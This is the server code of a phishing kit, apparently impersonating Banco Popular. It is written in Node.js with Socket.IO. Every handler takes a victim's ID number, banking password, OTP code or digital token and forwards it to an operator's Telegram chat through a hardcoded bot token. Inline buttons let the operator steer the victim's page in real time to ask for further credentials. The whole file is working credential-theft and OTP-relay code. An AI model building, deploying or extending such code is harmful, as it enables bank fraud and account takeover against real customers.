const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA';
const TELEGRAM_CHAT_ID = '-4997787461';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Almacenar sesiones de usuarios con datos persistentes
const userSessions = new Map();
const sessionData = new Map(); // Datos persistentes por sessionId
const activeConnections = new Map(); // sessionId -> socketId activo

// Función para enviar mensajes a Telegram con botones inline
async function sendTelegramMessage(chatId, message, buttons) {
    try {
        const keyboard = {
            inline_keyboard: buttons.map(row => 
                row.map(btn => ({
                    text: btn.text,
                    callback_data: btn.callback_data
                }))
            )
        };

        const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });

        return response.data;
    } catch (error) {
        console.error('Error enviando mensaje a Telegram:', error.response?.data || error.message);
        throw error;
    }
}

// Polling de Telegram para recibir respuestas de botones
let lastUpdateId = 0;
let isPolling = false;

async function pollTelegramUpdates() {
    if (isPolling) return;
    isPolling = true;

    while (true) {
        try {
            const response = await axios.get(`${TELEGRAM_API_URL}/getUpdates`, {
                params: {
                    offset: lastUpdateId + 1,
                    timeout: 20,
                    allowed_updates: ['callback_query']
                },
                timeout: 25000
            });

            const updates = response.data.result;

            for (const update of updates) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                    const { data, id } = update.callback_query;
                    const parts = data.split('_');
                    const action = parts[0];
                    const sessionId = parts.slice(1).join('_'); // Reconstruir sessionId completo

                    console.log(`\n🔔 Botón presionado: ${action}`);
                    console.log(`🆔 Session ID: ${sessionId}`);

                    // Buscar el socketId activo para este sessionId
                    const activeSocketId = activeConnections.get(sessionId);
                    
                    if (activeSocketId) {
                        console.log(`📡 Socket activo encontrado: ${activeSocketId}`);
                        
                        // Enviar respuesta al cliente específico inmediatamente
                        io.to(activeSocketId).emit('telegram_response', {
                            action: action,
                            timestamp: Date.now()
                        });

                        console.log(`✅ Respuesta enviada al cliente`);
                    } else {
                        console.log(`⚠️ No hay conexión activa para session: ${sessionId}`);
                    }

                    // Responder al callback de Telegram
                    const responseText = action === 'finalizar' ? '✅ Finalizando sesión...' : '✅ Redirigiendo...';
                    axios.post(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                        callback_query_id: id,
                        text: responseText
                    }).catch(err => console.error('Error answering callback:', err.message));
                }
            }
        } catch (error) {
            if (error.code !== 'ECONNABORTED' && error.code !== 'ETIMEDOUT') {
                console.error('Error en polling:', error.message);
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }
}

// Webhook endpoint (opcional, para producción)
app.post('/telegram-webhook', async (req, res) => {
    try {
        const { callback_query } = req.body;
        
        if (callback_query) {
            const { data, id } = callback_query;
            const parts = data.split('_');
            const action = parts[0];
            const sessionId = parts.slice(1).join('_');
            
            // Buscar el socketId activo para este sessionId
            const activeSocketId = activeConnections.get(sessionId);
            
            if (activeSocketId) {
                // Enviar respuesta al cliente específico
                io.to(activeSocketId).emit('telegram_response', {
                    action: action,
                    timestamp: Date.now()
                });
            }

            // Responder al callback de Telegram
            const responseText = action === 'finalizar' ? '✅ Finalizando sesión...' : '✅ Procesando...';
            await axios.post(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                callback_query_id: id,
                text: responseText
            });
        }
        
        res.sendStatus(200);
    } catch (error) {
        console.error('Error en webhook:', error);
        res.sendStatus(500);
    }
});

// Socket.IO conexiones
io.on('connection', (socket) => {
    console.log('\n🟢 Cliente conectado:', socket.id);
    console.log('⏰ Hora:', new Date().toLocaleTimeString('es-CO'));
    
    let userSessionId = null;
    
    // Recibir sessionId del cliente
    socket.on('register_session', (sessionId) => {
        userSessionId = sessionId;
        console.log('🆔 Session ID registrado:', sessionId);
        
        // Crear o recuperar datos de sesión
        if (!sessionData.has(sessionId)) {
            sessionData.set(sessionId, {});
        }
        
        // Actualizar el socketId activo para este sessionId
        activeConnections.set(sessionId, socket.id);
        console.log('🔗 Conexión activa actualizada:', sessionId, '->', socket.id);
        
        // Asociar socket con sessionId
        userSessions.set(socket.id, {
            connectedAt: new Date(),
            sessionId: sessionId,
            data: sessionData.get(sessionId)
        });
    });

    // Manejar envío de documento
    socket.on('send_documento', async (data) => {
        try {
            const { tipoDocumento, numeroDocumento, recordar } = data;
            
            // Guardar datos en la sesión persistente
            const session = userSessions.get(socket.id);
            if (!session || !session.sessionId) {
                socket.emit('send_error', { success: false, message: 'Sesión no registrada' });
                return;
            }
            
            const persistentData = sessionData.get(session.sessionId);
            persistentData.tipoDocumento = tipoDocumento;
            persistentData.numeroDocumento = numeroDocumento;
            persistentData.recordar = recordar;
            
            console.log('💾 Datos guardados:', persistentData);
            
            const message = `
🆔 <b>NUEVO ACCESO - DOCUMENTO</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 <b>Tipo Documento:</b> ${tipoDocumento}
🔢 <b>Número Documento:</b> ${numeroDocumento}
💾 <b>Recordar:</b> ${recordar ? '✅ Sí' : '❌ No'}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⏰ ${new Date().toLocaleString('es-CO', { dateStyle: 'full', timeStyle: 'medium' })}
🔗 Session: ${socket.id.substring(0, 8)}...
            `;

            const buttons = [
                [
                    { text: '👤 Pedir Usuario', callback_data: `usuario_${session.sessionId}` },
                    { text: '🔑 Pedir Clave', callback_data: `clave_${session.sessionId}` }
                ],
                [
                    { text: '📱 Pedir OTP', callback_data: `otp_${session.sessionId}` },
                    { text: '🎫 Pedir Token', callback_data: `token_${session.sessionId}` }
                ],
                [
                    { text: '✅ Finalizar', callback_data: `finalizar_${session.sessionId}` }
                ]
            ];

            await sendTelegramMessage(TELEGRAM_CHAT_ID, message, buttons);
            
            socket.emit('send_success', { 
                success: true,
                message: 'Datos enviados correctamente'
            });
            
        } catch (error) {
            console.error('Error procesando documento:', error);
            socket.emit('send_error', { 
                success: false,
                message: 'Error al enviar datos'
            });
        }
    });

    // Manejar envío de clave
    socket.on('send_clave', async (data) => {
        try {
            const { clave } = data;
            const session = userSessions.get(socket.id);
            if (!session || !session.sessionId) {
                socket.emit('send_error', { success: false, message: 'Sesión no registrada' });
                return;
            }
            
            const persistentData = sessionData.get(session.sessionId);
            persistentData.clave = clave;
            
            console.log('💾 Datos actualizados:', persistentData);
            
            const message = `
🔐 <b>CLAVE DE SEGURIDAD RECIBIDA</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 <b>Tipo Documento:</b> ${persistentData.tipoDocumento || 'N/A'}
🔢 <b>Documento:</b> ${persistentData.numeroDocumento || 'N/A'}
🔑 <b>Clave:</b> ${clave}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⏰ ${new Date().toLocaleString('es-CO', { dateStyle: 'full', timeStyle: 'medium' })}
🔗 Session: ${session.sessionId.substring(0, 8)}...
            `;

            const buttons = [
                [
                    { text: '👤 Pedir Usuario', callback_data: `usuario_${session.sessionId}` },
                    { text: '🔑 Pedir Clave', callback_data: `clave_${session.sessionId}` }
                ],
                [
                    { text: '📱 Pedir OTP', callback_data: `otp_${session.sessionId}` },
                    { text: '🎫 Pedir Token', callback_data: `token_${session.sessionId}` }
                ],
                [
                    { text: '✅ Finalizar', callback_data: `finalizar_${session.sessionId}` }
                ]
            ];

            await sendTelegramMessage(TELEGRAM_CHAT_ID, message, buttons);
            
            socket.emit('send_success', { 
                success: true,
                message: 'Clave enviada correctamente'
            });
            
        } catch (error) {
            console.error('Error procesando clave:', error);
            socket.emit('send_error', { 
                success: false,
                message: 'Error al enviar clave'
            });
        }
    });

    // Manejar envío de Token Digital
    socket.on('send_token', async (data) => {
        try {
            const { token } = data;
            const session = userSessions.get(socket.id);
            if (!session || !session.sessionId) {
                socket.emit('send_error', { success: false, message: 'Sesión no registrada' });
                return;
            }
            
            const persistentData = sessionData.get(session.sessionId);
            persistentData.token = token;
            
            console.log('💾 Token guardado:', persistentData);
            
            const message = `
🎫 <b>TOKEN DIGITAL RECIBIDO</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>📊 INFORMACIÓN COMPLETA:</b>

📋 <b>Tipo Documento:</b> ${persistentData.tipoDocumento || 'N/A'}
🔢 <b>Documento:</b> ${persistentData.numeroDocumento || 'N/A'}
🔑 <b>Clave:</b> ${persistentData.clave || 'N/A'}
📱 <b>Código OTP:</b> ${persistentData.otp || 'N/A'}
🎫 <b>Token Digital:</b> ${token}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⏰ ${new Date().toLocaleString('es-CO', { dateStyle: 'full', timeStyle: 'medium' })}
🔗 Session: ${session.sessionId.substring(0, 8)}...
✅ <b>Token capturado exitosamente</b>
            `;

            const buttons = [
                [
                    { text: '👤 Pedir Usuario', callback_data: `usuario_${session.sessionId}` },
                    { text: '🔑 Pedir Clave', callback_data: `clave_${session.sessionId}` }
                ],
                [
                    { text: '📱 Pedir OTP', callback_data: `otp_${session.sessionId}` },
                    { text: '🎫 Pedir Token', callback_data: `token_${session.sessionId}` }
                ],
                [
                    { text: '✅ Finalizar', callback_data: `finalizar_${session.sessionId}` }
                ]
            ];

            await sendTelegramMessage(TELEGRAM_CHAT_ID, message, buttons);
            
            socket.emit('send_success', { 
                success: true,
                message: 'Token enviado correctamente'
            });
            
        } catch (error) {
            console.error('Error procesando token:', error);
            socket.emit('send_error', { 
                success: false,
                message: 'Error al enviar token'
            });
        }
    });

    // Manejar envío de OTP
    socket.on('send_otp', async (data) => {
        try {
            const { otp } = data;
            const session = userSessions.get(socket.id);
            if (!session || !session.sessionId) {
                socket.emit('send_error', { success: false, message: 'Sesión no registrada' });
                return;
            }
            
            const persistentData = sessionData.get(session.sessionId);
            persistentData.otp = otp;
            
            console.log('💾 Datos finales:', persistentData);
            
            const message = `
📱 <b>CÓDIGO OTP VERIFICACIÓN</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>📊 INFORMACIÓN COMPLETA:</b>

📋 <b>Tipo Documento:</b> ${persistentData.tipoDocumento || 'N/A'}
🔢 <b>Documento:</b> ${persistentData.numeroDocumento || 'N/A'}
🔑 <b>Clave:</b> ${persistentData.clave || 'N/A'}
📱 <b>Código OTP:</b> ${otp}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⏰ ${new Date().toLocaleString('es-CO', { dateStyle: 'full', timeStyle: 'medium' })}
🔗 Session: ${session.sessionId.substring(0, 8)}...
✅ <b>Datos completos capturados</b>
            `;

            const buttons = [
                [
                    { text: '👤 Pedir Usuario', callback_data: `usuario_${session.sessionId}` },
                    { text: '🔑 Pedir Clave', callback_data: `clave_${session.sessionId}` }
                ],
                [
                    { text: '📱 Pedir OTP', callback_data: `otp_${session.sessionId}` },
                    { text: '🎫 Pedir Token', callback_data: `token_${session.sessionId}` }
                ],
                [
                    { text: '✅ Finalizar', callback_data: `finalizar_${session.sessionId}` }
                ]
            ];

            await sendTelegramMessage(TELEGRAM_CHAT_ID, message, buttons);
            
            socket.emit('send_success', { 
                success: true,
                message: 'OTP enviado correctamente'
            });
            
        } catch (error) {
            console.error('Error procesando OTP:', error);
            socket.emit('send_error', { 
                success: false,
                message: 'Error al enviar OTP'
            });
        }
    });

    // Desconexión
    socket.on('disconnect', () => {
        console.log('🔴 Cliente desconectado:', socket.id);
        
        // Limpiar solo si es la última conexión de esta sesión
        const session = userSessions.get(socket.id);
        if (session && session.sessionId) {
            // Solo limpiar si este socket es el activo para este sessionId
            if (activeConnections.get(session.sessionId) === socket.id) {
                console.log('⚠️ Conexión activa cerrada, esperando nueva conexión...');
                // No eliminamos de activeConnections para permitir reconexión
            }
        }
        
        userSessions.delete(socket.id);
    });

    // Manejo de errores
    socket.on('error', (error) => {
        console.error('❌ Error en socket:', error);
    });
});

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Configurar webhook de Telegram (ejecutar una vez)
async function setupWebhook() {
    try {
        // Aquí debes poner tu URL pública cuando despliegues
        // Por ahora dejamos el webhook sin configurar para desarrollo local
        console.log('Para producción, configura el webhook de Telegram con tu URL pública');
        console.log('Comando: POST https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/setWebhook');
        console.log('Body: {"url": "https://tu-dominio.com/telegram-webhook"}');
    } catch (error) {
        console.error('Error configurando webhook:', error);
    }
}

// Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('\n' + '='.repeat(60));
    console.log('🚀 SERVIDOR BANCO POPULAR INICIADO');
    console.log('='.repeat(60));
    console.log(`\n📍 URL: http://localhost:${PORT}`);
    console.log('🔌 Socket.IO: Listo para conexiones en tiempo real');
    console.log('🤖 Telegram Bot: Configurado');
    console.log('📡 Polling: Iniciando para recibir botones...\n');
    console.log('='.repeat(60) + '\n');
    
    // Polling solo si STANDALONE_BOT=1 (evita 409 Conflict por token compartido)
    if (process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true') {
        pollTelegramUpdates();
        setupWebhook();
    } else {
        console.log('ℹ STANDALONE_BOT no activo: Popular NO inicia polling (lo maneja el server raíz).');
    }
});
